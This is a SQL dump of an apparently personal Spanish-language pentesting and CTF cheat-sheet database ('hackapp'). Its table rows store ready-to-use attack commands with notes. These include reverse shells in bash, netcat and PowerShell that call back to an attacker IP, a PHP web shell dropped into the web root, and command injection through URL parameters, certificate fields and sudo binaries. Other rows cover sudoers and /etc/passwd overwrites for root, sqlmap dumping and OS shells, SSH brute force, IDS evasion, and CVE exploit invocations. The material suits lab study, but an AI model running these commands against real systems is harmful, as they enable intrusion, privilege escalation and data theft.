-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 20-08-2025 a las 03:22:52
-- Versión del servidor: 10.4.32-MariaDB
-- Versión de PHP: 8.0.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `hackapp`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `areas`
--

CREATE TABLE `areas` (
  `id_area` int(11) NOT NULL,
  `area` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `areas`
--

INSERT INTO `areas` (`id_area`, `area`) VALUES
(1, 'Pentesting'),
(2, 'Reversing'),
(3, 'OSINT'),
(4, 'Forensia'),
(5, 'Miscelanea'),
(6, 'Criptografía');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `comandos`
--

CREATE TABLE `comandos` (
  `id_comando` int(11) NOT NULL,
  `etiquetas` varchar(500) NOT NULL,
  `comando` varchar(1000) NOT NULL,
  `descripcion` varchar(1000) NOT NULL,
  `detalles` varchar(1000) NOT NULL,
  `archivos` varchar(100) NOT NULL,
  `id_area` int(11) NOT NULL,
  `id_fase` int(11) NOT NULL,
  `id_herramienta` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `comandos`
--

INSERT INTO `comandos` (`id_comando`, `etiquetas`, `comando`, `descripcion`, `detalles`, `archivos`, `id_area`, `id_fase`, `id_herramienta`) VALUES
(29, 'Escalar privilegios./LinEnum.sh, ./LinPeas.sh, resource', './LinEnum.sh\r\n./LinPeas.sh', 'Enumerar debilidades en linux para escalar privilegios', 'https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\r\nhttps://github.com/rebootuser/LinEnum\r\n\r\n#Dependiento de los resultados de Lin, Podemos consultar la siguiente pagina\r\nhttps://gtfobins.github.io/gtfobins/php/', '', 1, 4, 10),
(30, 'Escalar privilegios,  sudo -l /bin/bash NOPASSWD', '#1 sudo -l\r\n#2 (user2 : user2) NOPASSWD: /bin/bash\r\n#3 sudo -u user2 /bin/bash/archivo.sh\r\n#4 sudo -u user2 /bin/bash', 'Escalar privilegios mediante un archivo que se ejecuta como root (sin contrase&amp;ntilde;a)', '#1 Observamos los permisos que tiene nuestro usuario 1\r\n#2 Identificamos que el usuario 2 no requiere de contrase&amp;ntilde;a para ejecutar un archivo como root en bin/bash\r\n#3 cambiamos de usuario, por el que tiene mas privilegios\r\n#4 Tambien se puede cambiar de usuario de esta forma\r\n\r\n#Dependiento de los resultados de Lin, Podemos consultar la siguiente pagina\r\nhttps://gtfobins.github.io/gtfobins/php/', '', 1, 4, 10),
(31, 'Explotaci&amp;oacute;n de claves rsa , 22, clave privada, id_rsa, Authorized_keys, ssh', '#1 chmod 600 key_name\r\n#2 ssh -i key_name user_name@0.0.0.0\r\nsshpass -p &#039;password123&#039; ssh usuario@0.0.0.0', 'Conexion SSH mediante clave privada RSA', '#1Cambiamos el permiso al archivo con la clave rsa extra&amp;iacute;da (id_rsa)\r\n#2 realizamos la conexion\r\n\r\n\r\n', '', 1, 4, 10),
(32, 'shell inversa (reverse shell)', '#1 nc -lvnp 1234\r\n#2 bash -c &#039;bash -i &amp;gt;&amp;amp; /dev/tcp/1.1.1.1/1234 0&amp;gt;&amp;amp;1&#039;\r\n#3 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 1.1.1.1 1234 &amp;gt;/tmp/f\r\n#4 powershell -nop -c &amp;quot;$client = New-Object System.Net.Sockets.TCPClient(&#039;1.1.1.1&#039;,1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &#039;PS &#039; + (pwd).Path + &#039;&amp;gt; &#039;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&amp;quot;', 'Shell inversa (reverse slall) si se tiene acceso', '#1 En la maquina del atacante habilitamos un puerto para escuchar\r\n#2 En la maquina de la victima ejecutamos este comando (La ip es la maquina del atacante)\r\n\r\n#Varias shell inversas\r\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md', '', 1, 2, 10),
(33, 'curl wget server scp', '#1 python3 -m http.server 8000\r\n#2 wget http://0.0.0.0:8000/linenum.sh\r\n#3 curl http://0.0..:8000/linenum.sh -o linenum.sh\r\n#4 scp archivoAtransferir user@0.0.0.0:/tmp/nombreArchivoTransferido', 'Cargar un archivo remotamente', '#1 creamos un servidor en la ruta donde tenemos el archivo que queremos enviar\r\n#2: wget es una forma de descargar el archivo\r\n#3 CURL es otro metodo para descargar el archivo (-o es para el nombre del archivo de salida).\r\n#4 A diferencia de los otros metodos, este se ejecuta desde la maquina del atacante', '', 1, 1, 10),
(34, 'mejorar TTY o terminal, webshell, python', '#1 python -c &#039;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#039;\r\n#2 python3 -c &#039;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#039;', 'Mejorar la experiencia al utilizar una shell, ya sea con python 2 o python 3', '', '', 1, 7, 10),
(35, 'Inyeccion SQL sqlmap', '#1- sqlmap http://0.0.0.0/inicio/?id=1 --cookie=&amp;quot;PHPSESSID=6uct..&amp;quot; --dbs\r\n#2.-sqlmap -u http://0.0.0.0/inicio.php?id=2 --cookie=&amp;quot;PHPSESSID=6uc..&amp;quot; -D nomDB   --tables;\r\n#3.-sqlmap -u http://0.0.0.0/inicio.php?id=2 --cookie=&amp;quot;PHPSESSID=6uctmk..&amp;quot;  -D nomDB -T nomT   -columns;\r\n#4.-sqlmap -u http://0.0.0.0/inicio.php?id=2 --cookie=&amp;quot;PHPSESSID=6uc..&amp;quot; -D nombreDB -T nomT -C nomC -dump\r\n', 'Inyeccion SQL sqlmap', '#1.-Listamos las base de datos\r\n#2.-Seleccionamos una base de datos y muestra las tablas\r\n#3.-Seleccionamos una base de datos, seleciona la tablas y muestra las columnas\r\n#3.-Seleccionamos una base de datos, seleciona la tablas, selecciona, selecciona columna y muestra su contenido contenido', '', 1, 2, 2),
(36, 'hydra, fuerza bruta ssh, diccionario, 22', 'hydra 127.0.0.1 ssh -s 22 -l root -P pass.txt -f -vV', 'Ataque de diccionario con hydra, al protocolo ssh', '#1.-l minuscula si se sabe usuario L si se va a usar un diccionario\r\n#2.-p minuscula si se sabe la contrase&amp;ntilde;a P si se va a usar un diccionario', '', 1, 2, 11),
(37, 'wordpress plugin 2.7.10, metasploit wp', '#use auxiliary/scanner/http/wp_simple_backup_file_read\r\n#set RHOSTS es la direcci&amp;oacute;n IP de la m&amp;aacute;quina\r\n#set RPORT es el n&amp;uacute;mero de puerto de la m&amp;aacute;quina\r\n#set FILEPATH/flag.txt es el archivo que debe recuperarse\r\nexploit\r\ncat file-name', 'Explotar wordpress (plugin 2.7.10)', '', '', 1, 2, 3),
(38, 'testssl, ssl, lucky13,cbc, sweet, beast, 443,  heartbled', './testssl.sh dominio.org', 'Escanear protocolo ssl-tls (lucky13, heartbled, sweet, beast).', '', '', 1, 1, 12),
(39, 'theharvester, recoleccion correos, subdominios', 'theHarvester -d host dominio.org -l 50 -b all', 'Recolectar informacion publica de un host (correos, subdominios)', '', '', 1, 1, 13),
(40, 'ssl, tls, cifradores ciphers 443', '#1 nmap -p 443 --script ssl-enum-ciphers dominio.org\r\n#2 nmap --script-help ssl-enum-ciphers | less', 'Enumera algoritmos de cifrado ssl-tls', '', '', 1, 1, 1),
(41, 'transferencia de zona DNS, nmap', '#1 nmap --script=dns-zone-transfer dominio.org\r\n#2 nmap --script=dns-brute dominio.org\r\n#3 nmap --script=dns-brute nmap.org --script-args=dns-brute.hostlist=/usr/share/wordlists/rockyou.txt', 'Enumeracion DNS', '#1 Transferencia\r\n#2 Fuerza Bruta\r\n#3 diccionario', '', 1, 1, 1),
(42, 'nmap, firewall, IDS e IPS, netcat, nc', '#1 sudo nmap 0.0.0.0 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace\r\n#2 sudo nmap 0.0.0.0 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\r\n#3 sudo nmap 0.0.0.0 -n -Pn -p 445 -O -S 1.1.1.1 -e tun0\r\n#4 sudo nmap 0.0.0.0 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\r\n#5 ncat -nv --source-port 53 0.0.0.0 50000\r\n#6 sudo nmap -sSU -p 53 --script dns-nsid 0.0.0.0 -Pn -sV', 'Evasion de firewall o IDS (nmap y netcat)', '#1 El metodo de escaneo TCP ACK de Nmap (-sA) es mucho mas dific&amp;iacute;l de filtrar para firewalls y sistemas IDS/IPS que los escaneos SYN (-sS) o Connect (-sT) normales porque solo envian un paquete TCP con solo la bandera ACK.\r\n#2 Con (-D RND:5) colocamos 5 IP aleatorias como se&amp;ntilde;uelo y entre ellas la de nosotros.\r\n#3 Con (-S) se escanera el objetivo utilizando una IP diferente y (-e Tun0) selecciona la interfaz especifica\r\n#4 utilizamos un puerto de origen de nuestro escaneo para tratar de enga&amp;ntilde;ar al firewall y en ves de filtrado nos muestre su estado real.\r\n#5 Escaneo TCP y UDP cuando aparece un puerto filtrado', '', 1, 1, 1),
(44, 'cewl, recolecion de palabras, correos,numeros ,spidering', '#cewl -w salida.txt https://dominio.org/\r\n', 'Recolecta palabras, correos o numeros de un sitio web', '#-m 5   //Palabras con almenos 5 caracteres', '', 1, 1, 14),
(45, 'curl .xml xmllint, embellecer', '# curl -s http://0.0.0.0/users.xml | xmllint  --format -', 'Leer un archivo &amp;quot;.xml&amp;quot; de forma remota', '', '', 1, 1, 15),
(47, 'banner grabbing, nc, wget, tcpdump', '#1 nmap -sV --script=banner 0.0.0.0\r\n#2 nc -nv 0.0.0.0 puerto\r\n#2 sudo tcpdump -i eth0 host 1.1.1.1 and 0.0.0.0.\r\n#3 wget 0.0.0.0 -q -S', 'Banner grabing', '#2 al utilizar nc para el banner, si escuchamos con tcpdump se puede obtener mayor informaci&amp;oacute;n.', '', 1, 1, 10),
(48, 'python, shadow, passwd, leer', 'print open(&amp;quot;/etc/passwd&amp;quot;, &amp;quot;r&amp;quot;).read()', 'Leer archivo con python', 'Una ves que se tiene acceso a la ejecucion de comandos con python', '', 1, 7, 26),
(49, 'leer php, base64', 'page=php://filter/convert.base64-encode/resource=ruta/archivo.php', 'Leer el codigo de una pagina php', 'Eje: http://pagina.com/?page=php://filter/convert.base64-encode/resource=index.php\r\n\r\nNota: siempre incluir config.php, db.php\r\n\r\nNota: para decodificar  echo &#039;ENCODED_TEXT_FROM_PAGE&#039; | base64 -d', '', 1, 1, 27),
(50, 'sqlite, union', 'UNION SELECT columna1 FROM sqlite_master WHERE type=&#039;table&#039;', 'Inyecci&amp;oacute;n en sqlite', 'Nota; cuando se lista una tabla con UNION, deben seleccionarse el mismo numero de columnas de la primer tabla (columna1 o null)', '', 1, 2, 28),
(51, 'bypass login', '1# []\r\n2#cookies', 'Bypass login', '1#convertir las variables que se env&amp;iacute;an en array\r\n2#cambiar el nombre o valor de la cokie', '', 1, 1, 10),
(52, 'dnsmasq, servidor dns', '#1-sudo apt install dnsmasq\r\n#2-/etc/dnsmasq.conf\r\n#3-address=/#/ 0.0.0.0\r\n#4-systemctl restart dnsmasq\r\n#5-sudo nano /etc/resolv.conf\r\n#6-nameserver 127.0.0.1', 'dnsmasq como servidor DNS', '#1-Instalaci&amp;oacute;n de dnsmasq\r\n#2-COnfiguracion de dnmasq\r\n#3-Lin&amp;eacute;a que se debe agragar al final con la ip del objetivo\r\n#4-resetear dnsmasq\r\n#5-archivo de configuracion para que funcione como servidor DNS\r\n#6-Linea que se debe agregar al final', '', 1, 2, 29),
(53, 'puerto nc netcat', '#1 rlwrap nc -nvlp 8888\r\n#2 ncat -nvlp 12345', 'Poner puerto a la escucha con NetCat(linux-windows)', '1# linux\r\n#2 windows', '', 1, 2, 4),
(54, 'msfvenom, metasploit, payload, reverse shell LD_PRELOAD .so', '#1 msfvenom -p linux/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=0000 -f elf-so -o /tmp/malicious.so\r\n', 'Creacion de reverse shelL con msfvenom (LD_PRELOAD)', '#1 Crear un payload (carga util) para una reverse shell\r\nNota: al teclear solo msfvenom nos proporciona los diferentes parametros\r\nNota: Se puede poner un puerto a la escucha con NC o con metasploit\r\nNota: tambien se puede codificar en base 64 por si es necesario\r\nNota: para archivos .so se complementa la variable de entorno (LD_PRELOAD)', '', 1, 4, 3),
(55, 'LD_PRELOAD, environ, variable de entorno', '#1.- LD_PRELOAD', 'Variables de entorno en linux', '#1.- Variable de entorno, en Linux permite precargar bibliotecas compartidas (archivos .so)  se puede utilizar para depuraci&amp;oacute;n, creaci&amp;oacute;n de perfiles, inyecci&amp;oacute;n de c&amp;oacute;digo ', '', 1, 4, 10),
(56, 'environ variable de entorno, PID, proceso, task', '#1.- ps\r\n#2.- cat /proc/[PID]/task/[PID]/environ\r\n#3.- cat/proc/PID/environ', 'Leer la variable de entorno de un proceso en linux', '#1.-listamos los procesos\r\n#2.-Para leer el contenido de una variable de entorno de un PID especifico\r\n#3.-Con ps podemos obtener el PID del proceso\r\n', '', 1, 4, 10),
(57, 'injecion CLFR(salto de linea y retorno de carro) headers', '#1-?UA=1%0D%0AHost:%20wwwhost:445%0D%0A', 'injecion CLFR (retorno de carro OD y salto de linea OA) headers', '#1-con un retorno de carro (0D) y salto de linea (0A) antes y despues del host virtual objetivo', '', 1, 2, 30),
(58, 'enviromen entorno php ini', '#1-variable=FLAG=${variable_entorno}', 'Envio de una variable de entorno (PHP)', '#1-Enviamos una variable de entorno', '', 1, 2, 27),
(59, 'python, servidor', '#1- python3 -m http.server 8000\r\n', 'Crear un servidor con python', '', '', 1, 2, 26),
(60, 'redirecciones, location', '#1.- para seguir redirecciones a partir de location', 'Seguir redirecciones a partir de locations', '', '', 1, 2, 26),
(61, 'nc webshell url', 'http://0.0.0.0/shell.php?cmd=nc -c sh 1.1.1.1 1234', 'Conexion de webshell con nc mediante url', 'Antes se debe poner el puerto 1234 en escucha\r\n1.1.1.1 es la IP del atacante', '', 1, 2, 10),
(62, 'RSA key', 'ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2&amp;gt; /dev/null', 'Listar claves RSA', '', '', 1, 1, 10),
(63, 'webshell php', 'echo &amp;quot;&amp;lt;?php system($_GET[&#039;cmd&#039;]);?&amp;gt;&amp;quot; &amp;gt; /var/www/html/shell.php', 'Escribir una web shell mediante consola (PHP)', '', '', 1, 7, 27),
(64, 'sqlmap shell item burpsuite', 'sqlmap -r saveitem --os-shell --dbms=mysql', 'Obtener shell con sqlmap, guardando la peticion con burpsuite como item', '', '', 1, 2, 2),
(65, 'john, diccionario, hash', 'john archivohashes --wordlist=/usr/share/john/password.lst', 'Ataque de diccionario a hash', '', '', 1, 2, 31),
(66, 'binario dd ssh privatekey CMS v3.3.16', '#1 find  / -perm -u=s -type f 2&amp;gt;/dev/null\r\n#2 ssh-keygen -f mykey -N &amp;quot;&amp;quot;\r\n#3 cat mykey\r\n#4 LFILE=authorized_keys\r\n#5 cat /tcat /tmp/mykey.pub | /bin/dd of=$LFILE bs=1 seek=$(stat -c %s $LFILE)\r\n#6 sudo ssh -i archivodeclaveRSAprivada usuario@o.o.o.o.o', 'Creacion de clves RSA y coneccion SSH apartir de binario &amp;quot;dd&amp;quot; (CMS v3.3.16)', '#1 buscar binarios\r\n#2 accedemos a carpeta tmp y creamos clave privada y publica sin contrase&amp;ntilde;a\r\n#3 visualizamos la clave privada y la copiamos a la maquina atacante (permiso 600)\r\n#4 Nos vamos a la carpeta /home/user/.ssh e instanciamos la variable LFILE\r\n#5 Aprovechando el archivo &amp;quot;dd&amp;quot; copiamos la clabe publica en las llaves autorizadas (autorized_keys)\r\n#6 Iniciamos la conexion por ssh\r\n\r\nExplotacion de binarios\r\nhttps://gtfobins.github.io/\r\n\r\n', '', 1, 4, 10),
(67, 'Escalar privilegio binario dd sudoers  (CMS v3.3.16)', '#1 find  / -perm -u=s -type f 2&amp;gt;/dev/null\r\n#2 echo &amp;quot;ETSCTF ALL=(ALL) NOPASSWD:ALL&amp;quot; &amp;gt; sudoers.txt \r\n#3 LFILE=/etc/sudoers\r\n#4 cat sudoers.txt | /bin/dd of=$LFILE bs=1 seek=$(stat -c %s /etc/sudoers)\r\n#5 sudo su', 'Escalar privilegios a root con binario &amp;quot;dd&amp;quot; (CMS v3.3.16)', '#1 buscamos los binarios en el SO\r\n#2 nos vamos a la carpeta /tmp y creamos el archivo sudoers.txt\r\n#3 instanciamos la variable LFILE\r\n#4 agregamos nuestro usuario al archivo dusoers\r\n#5 cambiamos a root\r\n\r\nExplotacion de binarios\r\nhttps://gtfobins.github.io/', '', 1, 4, 10),
(68, 'CMS v3.3.16 51475', '#1 rlwrap nc -nlvp 1234\r\n#2 python3 51475.py  0.0.0.0 / 1.1.1.1:1234 admin\r\n', 'Explotacion de CMS v3.3.16', '#1 Ponemos puerto a la escucha\r\n#2 Ejecutamos el exploit\r\nNota: posteriormente buscar archivo binario dd', '', 1, 2, 32),
(69, 'TWG vimit tiniwebhallery', '#1 ALL : ALL) NOEXEC: NOPASSWD: /usr/bin/vi vimit\r\n#2 sudo /usr/bin/vi vimit\r\n#3 :e /etc/shadow\r\n#4 :e /root', 'Lectura de archivos a partir del archivo vimit', '#1 si nos encontramos con el archivo vimit con permisos NOEXEC\r\n#2 Ejecutamos el ecrhivo comno superusuario\r\n#3 y 4 Podemos leer archivos de root\r\nNota: es probable que el comando no se vea, pero al dar enter mostrar&amp;aacute; los resultados', '', 1, 7, 10),
(70, '$PATH flatline flatnux flatline', '#1 (ALL : ALL) NOPASSWD: /usr/local/bin/flatline\r\n#2 sudo /usr/local/bin/flatline (cat: flatliner: No such file or directory)\r\n#3 cd /temp\r\n#4 echo &amp;quot;/bin/bash&amp;quot; &amp;gt; cat\r\n#5 chmod +x cat\r\n#6 export PATH=/tmp:$PATH\r\n#7 sudo /usr/local/bin/flatline', 'Escalar privilegio aprovechando un binario sin permisos (flatline)', '#1 Encontramos un archivo que se puede ejecutar sin passwd con sudo -l\r\n#2 Ejecutamos el archivo y nos indica que no se encuentra el archivo cat\r\n#3 Nos dirigimos a la carpeta tmp para crearlo\r\n#4 Creamos el archivo cat\r\n#5 Le otorgamos permisos de ejecucion\r\n#6 Exportamos la ruta tmp a la variable de entorno $path\r\n#7 al ejecutar nuevamente el archivo nos convertimos en root\r\n', '', 1, 4, 10),
(71, 'LinEnum linpeas redireccion de puerto, qdrant CVE-2024-3829 CVE-2023-0947 CVE-2024-3584 flatpress, root', '#1 ./linEnum.sh o  linpeas.sh\r\n#2 ./reverse-sshx64\r\n#3 ssh -L 6333:127.0.0.1:6333 kali@10.0.160.225 -p 31337\r\n#4 Localhost:6333\r\n#5 python3 poc_read.py --url=&#039;http://localhost:6333&#039; --path=&#039;/etc/passwd&#039;\r\n#6 python3 poc_write.py --url=&#039;http://localhost:6333&#039; --local_path=&#039;payload.txt&#039; --remote_path=&#039;/etc/passwd&#039;\r\n#7 su root', 'Avance lateral y escalada de privilegios (flatpress)', '#1  Con los archivos sh analizamos que puertos estan habilitados en el objetivo\r\n#2  Cargamos y ejecutamos el archivo reverse-sshx64 en el objetivo\r\n#3 Desde la maquina atacante redirigimos al puerto &amp;quot;6333&amp;quot; previamente identificado en el objetivo\r\n#4 En la maquina atacante deberiamos poder visualizar en localhost el contenido del puerto redirigido\r\n#5 COn el archivo poc_read leemos el fichero passwd de la victima desde la maquina del atacante, copiamos el contenido\r\n#6 Con el archivo poc_write reescribimos el passwd de la victima con el contenido del archivo payload.txt creado en la maquina del atacante con el contenido del passwd de la victima, eliminando la contrase&amp;ntilde;a de root, quedando como sigue (root::0:0...)\r\n#7 Por ultimo en la maquina de la victima unicamente cambiamos a root\r\n\r\n\r\n\r\nNota: exploits (https://huntr.com/bounties/abd9c906-75ee-4d84-b76d-ce1386401e08)\r\nCOntrase&amp;ntilde;a:  &amp;quot;letmeinbrudipls&amp;quot;\r\n\r\n', '', 1, 4, 10),
(72, 'resource pentesting fuentes', '#1 https://github.com/danielmiessler/SecLists\r\n#2 https://gtfobins.github.io/\r\n#3 https://book.hacktricks.wiki/en/404.html\r\n#4 https://www.exploit-db.com/\r\n#5 https://gchq.github.io/CyberChef/\r\n#6 https://github.com/swisskyrepo/PayloadsAllTheThings', 'Fuentes para pentesting', '#1 diccionarios-listas- webshell- payloads, fuzzing\r\n#2 Binarios para escalar privilegios\r\n#3 Metodos para pentesting\r\n#4 Exploits y google hacks\r\n#5 Codigicacion\r\n#6 Para payloads', '', 1, 1, 10),
(73, 'Fuentes- resource', '#1-https://search.censys.io/\r\n#2-https://www.ssllabs.com/ssltest/index.html\r\n#3 https://crt.sh/\r\n#4 https://domain.glass/', 'Fuentes para reconocimiento en pentesting', '#1-busqueda de tecnologias relacionadas a un dominio\r\n#2-Prubas del protocolo ssl\r\n#3 certificados ssl\r\n#4 dns', '', 1, 1, 10),
(74, 'dnsrecon-dns', '#1 dnsrecon -d dominio.org -t std\r\n#2 dnsrecon -d dominio.org -D ~/list.txt -t brt\r\n', 'Enumeraci&amp;oacute;n de &amp;quot;DNS&amp;quot; (dnsrecon)', '#1-Escaneo estandar\r\n#2-Escaneo de diccionario', '', 1, 1, 33),
(75, 'nc udp nmap', '#1-nc -nv -u -z -w 1 0.0.0.0 120-123\r\n#2 sudo nmap -sV -sU 192.168.50.149', 'Escaneo de puertos UDP', '#1-Escaneo de puertos UDP\r\n#2-Escaneo udp con nmap', '', 1, 1, 4),
(76, 'Enumeracion SMTP', '#1 nc -nv 192.168.50.8 25', 'Enumeracion SMTP (Protocolo simple de transporte de correo)', '', '', 1, 1, 10),
(77, '', '#1 sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt', 'Enumeracion de SNMP (Protocolo simple de administraci&amp;oacute;n de redes)', '', '', 1, 1, 10),
(78, 'gobuster, subdominios dns', '#1- gobuster dns -d dns.org -w /usr/share/SecLists/Discovery/DNS/namelist.txt', 'Busqueda de subdominios (goubuster)', '#1 busqueda de subsominios', '', 1, 1, 34),
(79, 'shell Open Web Analytics CVE-2022-24637, fruityloops', '#1 Identificamos la tecnolog&amp;iacute;a(Open Web Analytics)\r\n#2 El exploit de exploitDB no funciona, en git se encuentra el corregido (51026).\r\n#3 log_location = &amp;quot;/var/www/html/owa-data/caches/&amp;quot; + shell_filename\r\n#4 python 51026-web-open-analics.py -u admin -p test  http://0.0.0.0/ 1.1.1.1 1234\r\n', 'Obtenci&amp;oacute;n de shell en Open Web Analytics (CVE-2022-24637, exploit 51026)', '\r\n#2 Exploit arreglado (https://github.com/icebreack/CVE-2022-24637/blob/main/51026_fixed.py)\r\n#3 Verificamos que esta lin&amp;eacute;a se encuentre igual\r\n#4 Ejecutamos el exploit, pero antes ponemos el puerto respectivo a la escucha', '', 1, 2, 32),
(80, 'fruityloops binario @apphp/object-resolver Prototype Pollution vulnerability _proto_.success', '#1 ALL : ALL) NOPASSWD: /usr/local/bin/binario\r\n#2 cat /usr/local/bin/fruityloops\r\n#3 echo &#039;#!/bin/bash&#039; &amp;gt; /tmp/pwned\r\n#4 echo &#039;cp /bin/bash /tmp/rootbash&#039; &amp;gt;&amp;gt; /tmp/pwned\r\n#5 echo &#039;chmod +s /tmp/rootbash&#039; &amp;gt;&amp;gt; /tmp/pwned\r\n#6 chmod +x /tmp/pwned\r\n#7 sudo /usr/local/bin/binario &amp;quot;__proto__.success&amp;quot;\r\n#8 /tmp/rootbash -p', 'Escalar privilegios a partir de un binario (con &amp;quot;@apphp/object-resolve&amp;quot;r) enviando el parametro (_proto_.success)', '#1 identificamos el binario con sudo -l\r\n#2 Analizamos el binario y observamos que importa el manipulador de objetos @apphp/object-resolver el cual es vulnerable a Prototype Pollution vulnerability\r\n#3 creamos el archivo pwned, porque en el binario es al que apunta en esta linea (exec(&amp;quot;/tmp/pwned&amp;quot;);\r\n#4 creamos rootbash y copiamos a pwned\r\n#5 a ambos damos permisos setuid\r\n#5 permiso de ejecucion a pwned\r\n#7 Ejecutamos con sudo en binario y enviamos el parametro (__proto__.success) para que sea validado en la linea &amp;quot;if(authentication.success === true)&amp;quot;\r\n#8 ejecutamos rootbash\r\n\r\n', '', 1, 4, 10),
(81, 'haven CVE-2024-39906-GHSL-2024-093', '/indieauth/authorization?response_type=code&amp;amp;client_id=|%20nc%20-c%20sh%201.1.1.1%201234|%20https:%2f%2fexample.org&amp;amp;redirect_uri=any&amp;amp;state=any&amp;amp;code_challenge=12345678&amp;amp;code_challenge_method=S256', 'Obtencion de webshell en haven ( CVE-2024-39906)', '#1 Request utilizado para obtener una webshell (Se necesitan las credenciales de admin)\r\n#2 las credenciales se localizaron en:\r\nhttps://github.com/havenweb/haven/blob/master/docker-compose.yml\r\n(changeme@havenweb.org:ChangeMeN0W)', '', 1, 2, 32),
(82, 'havent binario /usr/local/bin/certer', '#1 (ALL : ALL) NOPASSWD: /usr/local/bin/certer\r\n#2 sudo /usr/local/bin/certer &amp;quot;&amp;amp;nc -e /bin/bash 1.1.1.1 12345&amp;amp;&amp;quot;', 'Escalar privilegio a partir de binario (haven)', '-Contenido\r\n#! /usr/bin/env node\r\nvar args = process.argv.slice(2);\r\nvar https=require(&#039;https&#039;);\r\nvar express=require(&#039;express&#039;);\r\nvar root = require(&amp;quot;devcert-sanscache&amp;quot;);\r\nvar appname = args[0];\r\nlet app = express();\r\n\r\nroot(appname).then((ssl) =&amp;gt; {\r\n  https.createServer(ssl, app).listen(3000);\r\n});\r\n\r\n\r\n#2-explotaci&amp;oacute;n (poner antes puerto a la escucha)', '', 1, 4, 10),
(83, 'CVE-2024-27348, hugecert', '#1 python3 CVE-2024-27348.py -t http://0.0.0.0:8080 -c &amp;quot;nc -c sh 1.1.1.1 1234&amp;quot; ', 'Explotacion de webshell (CVE-2024-27348)', '#1 descarga y ejecuci&amp;oacute;n de la POC https://github.com/kljunowsky/CVE-2024-27348/tree/main', '', 1, 2, 32),
(84, 'CVE-2024-27348, hugecert, RSA, binario', '#1 (ALL : ALL) NOPASSWD: /opt/node/bin/certer\r\n#2 sudo/opt/node/bin/certer\r\n#3 cat /opt/node/bin/certer\r\n#4 openssl req -new -newkey rsa:2048 -nodes -keyout evil.key -x509 -days 365 -out evil.pem -subj &amp;quot;/CN=`nc -e /bin/bash 1.1.1.1 12345`&amp;quot;\r\n#5 sudo /opt/node/bin/certer evil.pem', 'Escalar privilegios a partir de un binario que ejecuta un certificado RSA', '#1 identificacion de binario\r\n#2 ejecucion para observar su comportamiento (Provide a certificate file to process\r\n)\r\n\r\n#3 Observamos su contenido\r\n!/opt/node/bin/node\r\nconst crypto = require(&amp;quot;crypto&amp;quot;);\r\nconst { exec } = require(&#039;child_process&#039;);\r\nconst fs = require(&#039;fs&#039;);\r\nvar args = process.argv.slice(2);\r\nif(args.length===0)\r\n{\r\n  console.log(&amp;quot;Provide a certificate file to process&amp;quot;);\r\n  process.exit(1);\r\n}\r\ncert = new crypto.X509Certificate(fs.readFileSync(args[0]).toString());\r\nsubj=cert.subject.replace(/\\/g, &#039;&#039;).replace(/CN=/g,&#039;&#039;);\r\nexec(`mkdir /certs/${subj}`);\r\n\r\n#Se deduce que el parametro subj no esta sanitizado y llama el apartado Comun Name (CN) de un certificado\r\n#4 Creamos el certificado con el codigo para conectarnos a nuestra maquina de ataque\r\n#5 ejecutamos el binario pasando como parametro el certificado creado como par&amp;aacute;metro\r\n\r\n', '', 1, 4, 10),
(85, 'phobex, cve-2024-25415 51957', '#1 identificamos la tecnologia y vulnerabilidades asociadas (phoenix)\r\n#2 python3 phoenix-51957.py  http://dominio.org admin password123 &#039;nc -e /bin/bash 1.1.1.1 1234&#039; \r\n\r\n', 'Explotacion de webshell (cve-2024-25415 de phoebex)', '# dentificamos el recurso Admin y probamos contrase&amp;ntilde;as comunes (admin:password123)\r\n#1 https://nvd.nist.gov/vuln/detail/cve-2024-25415\r\n#2 Buscamos un exploit y lo ejecutamos (51957)\r\n', '', 1, 2, 32),
